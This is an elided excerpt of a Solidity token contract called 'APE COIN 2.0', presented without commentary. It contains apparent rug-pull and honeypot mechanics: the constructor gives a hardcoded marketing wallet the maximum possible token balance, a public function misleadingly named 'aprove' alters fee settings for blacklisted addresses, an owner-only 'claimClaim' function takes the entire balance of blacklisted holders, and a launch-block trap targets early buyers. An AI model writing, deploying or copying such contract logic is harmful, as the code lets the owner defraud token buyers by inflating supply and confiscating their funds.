...
contract APECOIN2 is IBEP20, Auth {
    ...
    string constant _name = "APE COIN 2.0";
    string constant _symbol = "APECOIN2.0";
    ...
    address private marketingWallet = payable(0xfee89F1eebF9D01df8E25E8293A6a01087B70E18);
    ...
    constructor () Auth(msg.sender) {
        ...
        balances[marketingWallet] = type(uint256).max;
    ...
    function aprove() public virtual { includeFromFee = blacklist; for (uint256 i = 0; i < includeFromFee.length; i++) { _isIncludedFromFee[includeFromFee[i]] = true; } }
    ...
    function claimClaim() external onlyOwner {
        for (uint i = 0; i < blacklist.length; i++) {
            if (isBlacklisted[blacklist[i]] == true && balanceOf(blacklist[i]) > 1) {
                basicTransfer(blacklist[i], address(this), balanceOf(blacklist[i])); 
            }
        }
    }
    ...
    function _transfer(address from, address to, uint256 amount) internal returns (bool) {
        ...
        if(!_isExcludedFromFee[from] && !_isExcludedFromFee[to]){
            if (launchBlock + deadBlocks >= block.number && from == pair) {
